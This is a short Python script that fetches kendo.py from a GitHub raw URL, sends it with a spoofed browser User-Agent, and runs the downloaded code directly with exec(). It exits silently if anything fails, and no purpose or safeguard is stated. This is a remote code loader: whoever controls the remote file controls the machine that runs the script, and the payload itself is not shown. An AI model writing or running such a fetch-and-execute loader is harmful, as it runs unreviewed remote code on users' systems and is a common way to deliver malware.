import requests, sys
try:
	exec(requests.Session().get('https://raw.githubusercontent.com/nguyenducmanh609/tv/main/kendo.py', headers={"User-Agent": "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.1.2.3 Safari/537.36","Accept-Encoding": "gzip, deflate, br"}).content.decode('utf-8').replace('\r\n', '\n'))
except:
	sys.exit()